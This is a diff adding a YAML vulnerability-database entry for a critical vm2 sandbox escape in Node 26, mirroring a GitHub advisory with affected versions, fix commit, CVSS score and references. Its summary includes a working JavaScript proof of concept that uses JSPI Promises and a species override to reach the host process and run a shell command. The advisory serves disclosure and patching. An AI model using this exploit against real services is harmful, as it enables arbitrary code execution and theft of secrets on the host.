@@ -1,0 +1,171 @@
+advisory_id: GHSA-6j2x-vhqr-qr7q
+datasource_id: github_osv/GHSA-6j2x-vhqr-qr7q
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-6j2x-vhqr-qr7q/GHSA-6j2x-vhqr-qr7q.json
+aliases:
+  - CVE-2026-47210
+summary: |
+  vm2 sandbox escape via JSPI-backed Promise `.finally()` species bypass
+  ### Summary
+  A sandbox escape vulnerability in `vm2` allows arbitrary code execution in the host process when untrusted code is executed with async support on runtimes exposing WebAssembly JSPI (`WebAssembly.promising` / `WebAssembly.Suspending`). In the tested configuration, a JSPI-backed Promise can reach `Promise.prototype.finally()` in a way that bypasses the expected Promise-species hardening and exposes a host-originated rejection object to attacker-controlled species logic, breaking the sandbox boundary.
+
+  This is a critical sandbox escape: any application that treats `vm2` as a security boundary may be fully compromised.
+
+  ### Details
+
+  On node26, JSPI-backed Promises created through `WebAssembly.promising(...)` do not behave like ordinary sandbox Promises.
+
+  That path yields a host-originated `TypeError` during JSPI processing. Inside attacker-controlled species logic reached through `.finally()`, the rejection object exposes a usable host constructor chain. In the tested environment, the rejection object's constructor path can be used to reach host `process`, which leads to arbitrary code execution in the host process.
+
+  This behavior is specific to the JSPI / `.finally()` interaction. In contrast, the corresponding `then` / `catch` paths still appeared to route through `vm2`'s expected `localPromise` machinery in my testing.
+
+  ### PoC
+  Environment: node:26-bookworm
+  ```javascript
+  const {VM} = require("vm2");
+  const vm = new VM();
+  console.log(vm.run(`
+  (()=>{let b=Uint8Array.of(0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,109,1,102,0,0,3,2,1,0,7,7,1,3,114,117,110,0,1,10,6,1,4,0,16,0,11);WebAssembly.instantiate(b,{m:{f:new WebAssembly.Suspending(()=>WebAssembly.compileStreaming(Promise.resolve(0)))}}).then(r=>{let p=WebAssembly.promising(r.instance.exports.run)();class F{constructor(x){this.s=0;this.q=[];x(v=>{this.s=1;this.v=v;for(let i of this.q)if(i[0])i[0](v)},e=>{
+      let P=e.constructor.constructor('return process')()
+      P.mainModule.require('child_process').execSync('touch pwned');
+      this.s=2;this.v=e;for(let i of this.q)if(i[1])i[1](e)})}then(f,r){if(this.s==1)return f?f(this.v):this.v;if(this.s==2){if(r)return r(this.v);throw this.v}this.q.push([f,r]);return 0}}Object.defineProperty(F,Symbol.species,{get(){return F}});Object.defineProperty(p,'constructor',{get(){return F}});p.finally(()=>{})});return 1})()
+  `));
+  ```
+
+  ### Impact
+  This is a **sandbox escape leading to arbitrary code execution in the host process**.
+
+  Who is impacted:
+
+  - any application using `vm2` to execute attacker-controlled JavaScript as a security boundary
+  - especially Node.js runtimes exposing WebAssembly JSPI features (Node 26)
+
+  Practical impact:
+
+  - arbitrary command execution in the host process
+  - arbitrary file read / write accessible to the host process
+  - theft of secrets, tokens, credentials, and application data
+  - complete compromise of services relying on `vm2` isolation
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.11.3
+    fixed_versions: vers:npm/3.11.4
+    affected_packages:
+      - pkg:npm/vm2@0.1.0
+      - pkg:npm/vm2@0.1.1
+      - pkg:npm/vm2@0.2.0
+      - pkg:npm/vm2@0.2.1
+      - pkg:npm/vm2@0.2.2
+      - pkg:npm/vm2@0.2.3
+      - pkg:npm/vm2@0.2.4
+      - pkg:npm/vm2@1.0.0
+      - pkg:npm/vm2@1.0.1
+      - pkg:npm/vm2@2.0.0
+      - pkg:npm/vm2@2.0.2
+      - pkg:npm/vm2@3.0.0
+      - pkg:npm/vm2@3.0.1
+      - pkg:npm/vm2@3.1.0
+      - pkg:npm/vm2@3.2.0
+      - pkg:npm/vm2@3.3.0
+      - pkg:npm/vm2@3.3.1
+      - pkg:npm/vm2@3.4.0
+      - pkg:npm/vm2@3.4.1
+      - pkg:npm/vm2@3.4.2
+      - pkg:npm/vm2@3.4.3
+      - pkg:npm/vm2@3.4.4
+      - pkg:npm/vm2@3.4.5
+      - pkg:npm/vm2@3.4.6
+      - pkg:npm/vm2@3.5.0
+      - pkg:npm/vm2@3.5.1
+      - pkg:npm/vm2@3.5.2
+      - pkg:npm/vm2@3.6.0
+      - pkg:npm/vm2@3.6.1
+      - pkg:npm/vm2@3.6.2
+      - pkg:npm/vm2@3.6.3
+      - pkg:npm/vm2@3.6.4
+      - pkg:npm/vm2@3.6.5
+      - pkg:npm/vm2@3.6.6
+      - pkg:npm/vm2@3.6.7
+      - pkg:npm/vm2@3.6.8
+      - pkg:npm/vm2@3.6.9
+      - pkg:npm/vm2@3.6.10
+      - pkg:npm/vm2@3.6.11
+      - pkg:npm/vm2@3.7.0
+      - pkg:npm/vm2@3.8.0
+      - pkg:npm/vm2@3.8.1
+      - pkg:npm/vm2@3.8.2
+      - pkg:npm/vm2@3.8.3
+      - pkg:npm/vm2@3.8.4
+      - pkg:npm/vm2@3.9.0
+      - pkg:npm/vm2@3.9.1
+      - pkg:npm/vm2@3.9.2
+      - pkg:npm/vm2@3.9.3
+      - pkg:npm/vm2@3.9.4
+      - pkg:npm/vm2@3.9.5
+      - pkg:npm/vm2@3.9.6
+      - pkg:npm/vm2@3.9.7
+      - pkg:npm/vm2@3.9.8
+      - pkg:npm/vm2@3.9.9
+      - pkg:npm/vm2@3.9.10
+      - pkg:npm/vm2@3.9.11
+      - pkg:npm/vm2@3.9.12
+      - pkg:npm/vm2@3.9.13
+      - pkg:npm/vm2@3.9.14
+      - pkg:npm/vm2@3.9.15
+      - pkg:npm/vm2@3.9.16
+      - pkg:npm/vm2@3.9.17
+      - pkg:npm/vm2@3.9.18
+      - pkg:npm/vm2@3.9.19
+      - pkg:npm/vm2@3.10.0
+      - pkg:npm/vm2@3.10.1
+      - pkg:npm/vm2@3.10.2
+      - pkg:npm/vm2@3.10.3
+      - pkg:npm/vm2@3.10.4
+      - pkg:npm/vm2@3.10.5
+      - pkg:npm/vm2@3.11.0
+      - pkg:npm/vm2@3.11.1
+      - pkg:npm/vm2@3.11.2
+      - pkg:npm/vm2@3.11.3
+    fixed_packages:
+      - pkg:npm/vm2@3.11.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/patriksimek/vm2
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/patriksimek/vm2
+        commit: 6915fa4d9bcebd47b9a4f39a1adc1aa94ef6ffc6
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-6j2x-vhqr-qr7q/GHSA-6j2x-vhqr-qr7q.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-913
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/commit/6915fa4d9bcebd47b9a4f39a1adc1aa94ef6ffc6
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.4
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-6j2x-vhqr-qr7q
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-47210
+    reference_type:
+    reference_id:
+exploits: []
